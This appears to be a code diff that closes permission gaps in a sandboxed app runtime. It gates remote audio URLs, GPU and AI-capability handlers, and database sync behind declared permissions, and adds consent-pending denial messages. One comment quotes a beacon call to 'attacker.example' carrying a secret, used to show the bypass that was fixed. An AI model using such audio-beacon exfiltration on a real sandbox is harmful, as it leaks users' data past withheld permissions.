@@ -15,6 +15,7 @@ import type { ScriptBlock, LogicBlock } from '../parser/ast';
 import type { AppPermissions } from '../bundle/types';
 import { getFileByRef, registerFileRef } from './file-registry';
 import { pcmToWavDataUrl } from './wav';
+import { isRemoteUrl } from '../renderer/sanitize-html';
 import type {
   BundleFileProvider,
   AIPermissionConfig,
@@ -141,6 +142,17 @@ export interface PermissionConfig {
     gpu?: GpuPermissionConfig;
     sync?: { enabled?: boolean };
   };
+  /**
+   * The bundle declared capabilities and the user has not answered yet.
+   *
+   * Set by the host when it boots an app with its declared capabilities
+   * withheld so the UI can be seen before anything is granted. `permissions`
+   * is empty in that state, so every check already denies; this only changes
+   * what the denial says. Without it the app is told to "add net.enabled to
+   * permission.json" — advice for an author, about a file that already says
+   * exactly that, aimed at a user who has simply not clicked Allow.
+   */
+  consentPending?: boolean;
 }
 
 /** Pending host call from the VM (mirrors Rust PendingHostCall) */
@@ -1799,6 +1811,27 @@ export class SoftNScriptRuntime {
           result = await this.executeHostCall(call);
         } catch (err) {
           result = { error: String(err) };
+          // The callback gets `{error}`, and almost no bundle checks for it —
+          // so a refused call is a call that quietly does nothing. That was
+          // tolerable while consent gated the load and a running app was always
+          // a fully granted one; with the consent bar an app can be asked for
+          // work it is not allowed to do yet, and "nothing happened" is the one
+          // outcome that reads as broken rather than as withheld.
+          // "failed", not "refused": this catch is around the whole
+          // executeHostCall switch, so a fetch timeout, a malformed argument
+          // and a denied capability all arrive here. The line said "refused"
+          // for every one of them, and the word was the entire content of it.
+          //
+          // The console is as far as this goes today, and that is a gap, not a
+          // conclusion: a user who presses DeviceKit's Fetch button while the
+          // bar is unanswered sees the button do nothing at all. The runtime
+          // cannot answer it inside the app — it does not know where in a
+          // bundle's layout a message belongs, and putting one there would be
+          // inventing UI the bundle did not ask for. It could answer it on the
+          // permission bar, which is the runtime's own surface and already on
+          // screen; that needs a refusal callback threaded from here through
+          // SoftNRenderer to the bar, and it is not built.
+          console.warn(`[SoftN] ${call.kind} failed: ${String(err)}`);
         }
 
         // The engine may have been disposed while the host call was in flight.
@@ -1949,6 +1982,16 @@ export class SoftNScriptRuntime {
         `${capability} access not permitted: this bundle ships no permission.json. ` +
           `Declare the capabilities it needs — { "permissions": { "${capability}": { "enabled": true } } } — ` +
           `so the user can see and approve them.`
+      );
+    }
+    if (this.permissionConfig.consentPending) {
+      // Running with everything withheld until the user answers the consent
+      // bar. Deny like any other missing capability, but say why: the bundle
+      // did declare this, so telling the author to declare it is a lie the
+      // user cannot act on.
+      throw new Error(
+        `${capability} access not permitted yet: this app has asked for it and you have not allowed it. ` +
+          `Choose Allow in the permission bar at the top of the app to grant it.`
       );
     }
     // Permission config IS set — deny by default for any capability not explicitly enabled.
@@ -2433,11 +2476,21 @@ export class SoftNScriptRuntime {
 
   // ── Audio ──
   //
-  // Deliberately ungated. A template can already write `<audio src=… autoPlay>`
-  // with no declared capability, so asking for one here would gate the API and
-  // not the thing it wraps — security theatre that only inconveniences authors
-  // who use the tidier route. Sound is a nuisance, not a disclosure: it reads
-  // nothing, sends nothing, and stops when the app closes.
+  // Playing a bundle's own sound needs no capability: a `blob:`, `data:` or
+  // bundle-relative source carries its bytes with it, reads nothing and sends
+  // nothing, and a template can write `<audio src=… autoPlay>` for the same
+  // effect. A remote source is a different act. `new Audio(url)` issues the GET
+  // whether or not autoplay policy lets the sound out, and `audio.whenEnded`
+  // reports 'ended' separately from 'error' — so an unchecked remote src is not
+  // only a beacon, it is a read-back oracle telling the bundle whether the
+  // request succeeded. That is `softn.net.fetch` wearing a different name, and
+  // it goes behind the same gate and the same allowed_hosts list.
+  //
+  // This comment used to say "sound is a nuisance, not a disclosure: it reads
+  // nothing, sends nothing", and that reasoning was why no gate was here.
+  // Proven wrong against the real runtime: with every capability withheld,
+  // audio.play('https://attacker.example/beacon?secret=1') constructed the
+  // element with that exact URL and answered {played:true}.
 
   /**
    * Turn whatever the script passed into something an <audio> can load.
@@ -2471,6 +2524,15 @@ export class SoftNScriptRuntime {
 
     const src = this.resolveAudioSrc(rawSrc);
     if (!src) return { played: false, reason: `no such sound: ${rawSrc}` };
+
+    // Checked on the resolved URL, not the argument: `asset()` answers with a
+    // blob: or data: URL for a bundle path, and a path it does not recognise
+    // comes back unchanged — including a protocol-relative `//host/x`, which
+    // the browser resolves against the page's own http(s) scheme.
+    if (isRemoteUrl(src)) {
+      this.checkPermission('net');
+      this.checkNetHost(src);
+    }
 
     const el = new Audio(src);
     const own = typeof options.volume === 'number' ? Math.max(0, Math.min(1, options.volume)) : 1;
@@ -2710,6 +2772,12 @@ export class SoftNScriptRuntime {
   }
 
   private async handleAIGetCapabilities(): Promise<unknown> {
+    // The only capability-shaped handler that answered anyone. It reports
+    // webgpu/webgl/wasm availability and a maxModelSizeMB derived from
+    // navigator.deviceMemory — a device fingerprint .logic has no other route
+    // to — and it answered a bundle shipping no permission.json, and a bundle
+    // whose consent bar was still up.
+    this.checkPermission('ai');
     const { detectCapabilities } = await import('./ai-manager');
     return detectCapabilities();
   }
@@ -2907,6 +2975,12 @@ export class SoftNScriptRuntime {
   }
 
   private async handleGpuReleaseAll(): Promise<unknown> {
+    // The only gpu handler that reached getGpuComputeManager unchecked, and the
+    // getter only wires the declared limits into a manager it is creating. A
+    // denied app calling this built the manager with no config at all, and the
+    // `if (!this.gpuComputeManager)` cache meant the buffer cap and the shader
+    // allowlist were then missing for the rest of the session.
+    this.checkPermission('gpu');
     const mgr = await this.getGpuComputeManager();
     return mgr.releaseAll();
   }
@@ -3109,8 +3183,17 @@ export function createDBNamespace(
 
     startSync: (room: string, options?: Record<string, unknown>) => {
       const permissionConfig = getPermissionConfig?.();
-      if (permissionConfig?.permissions && !permissionConfig.permissions.sync?.enabled) {
-        console.error('[XDB Sync] Sync not permitted. Add sync.enabled to permission.json');
+      // `permissionConfig?.permissions && !…sync?.enabled` short-circuited to
+      // false when the config was absent, so the one path that starts WebRTC
+      // replication of the whole database opened itself for exactly the bundles
+      // the rest of the model trusts least. checkPermission('sync') and the
+      // renderer's own xdb bridge both deny an absent config; this now agrees.
+      if (!permissionConfig?.permissions?.sync?.enabled) {
+        console.error(
+          permissionConfig?.consentPending
+            ? '[XDB Sync] Sync not allowed yet. Choose Allow in the permission bar to grant it.'
+            : '[XDB Sync] Sync not permitted. Add sync.enabled to permission.json'
+        );
         return;
       }
       const syncOpts: Record<string, unknown> = { room, ...(options || {}) };
